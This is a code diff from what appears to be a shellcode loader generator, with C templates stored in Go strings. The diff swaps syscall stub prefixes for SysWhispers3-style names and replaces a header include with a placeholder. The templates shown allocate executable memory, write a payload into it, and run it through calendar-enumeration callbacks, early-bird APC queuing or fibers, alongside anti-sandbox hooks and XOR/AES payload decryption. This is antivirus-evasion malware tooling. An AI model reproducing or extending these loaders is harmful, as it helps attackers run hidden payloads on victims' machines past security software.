@@ -26,10 +26,10 @@ var __c__sandbox2 = `
 // 回调函数加载
 var __c__callback = `
     DWORD oldProtect;
-    VAVNtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
-    VAVNtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
-    VAVNtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
-	VAVNtWriteVirtualMemory(GetCurrentProcess(), addr, xpp, length, NULL);
+    Sw3NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
+    Sw3NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
+    Sw3NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
+	Sw3NtWriteVirtualMemory(GetCurrentProcess(), addr, xpp, length, NULL);
 	EnumCalendarInfo((CALINFO_ENUMPROC)addr, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
 `
 var __c__earlyBird = `
@@ -43,20 +43,20 @@ var __c__earlyBird = `
 
     QueueUserAPC((PAPCFUNC)shellAddress, GetCurrentThread(), NULL);
     testAlert();
-    //VAVNtAllocateVirtualMemory(hProcess, &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    //VAVNtWriteVirtualMemory(hProcess, addr, xpp, length, &bytesWritten);
+    //Sw3NtAllocateVirtualMemory(hProcess, &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    //Sw3NtWriteVirtualMemory(hProcess, addr, xpp, length, &bytesWritten);
     ////LPVOID addr1 = VirtualAlloc(NULL, sizeof(xpp), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     ////RtlMoveMemory(addr1, xpp,length);
     ////QueueUserAPC((PAPCFUNC)addr1, GetCurrentThread(), NULL);
-	//VAVNtQueueApcThread(GetCurrentThread(),(PAPCFUNC)addr,NULL,NULL,NULL);
-    //VAVNtTestAlert();
+	//Sw3NtQueueApcThread(GetCurrentThread(),(PAPCFUNC)addr,NULL,NULL,NULL);
+    //Sw3NtTestAlert();
 `
 
 // 纤程加载
 var __c__fiber = `
     PVOID mainFiber = ConvertThreadToFiber(NULL);
-    VAVNtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x40);
-    VAVNtWriteVirtualMemory(GetCurrentProcess(), addr, xpp, length, NULL);
+    Sw3NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x40);
+    Sw3NtWriteVirtualMemory(GetCurrentProcess(), addr, xpp, length, NULL);
 
     PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)addr, NULL);
 
@@ -108,7 +108,7 @@ var __c_xor = `
 #include <Windows.h>
 #include <stdio.h>
 #include <stdbool.h>
-#include "syscalls_common.h" 
+REPLACE_STSYSCALL_Framework
 #include <Rpc.h>
 
 typedef VOID(NTAPI* myNtTestAlert)(VOID);
@@ -163,7 +163,7 @@ var __c__aes = `
 #include <stdbool.h>
 #include <Windows.h>
 #include "aes.h"
-#include "syscalls_common.h"
+REPLACE_STSYSCALL_Framework
 
 REPLACE_ANTI_SANDBOX1
 char url1[] = "https://www.google.com/search?q=";
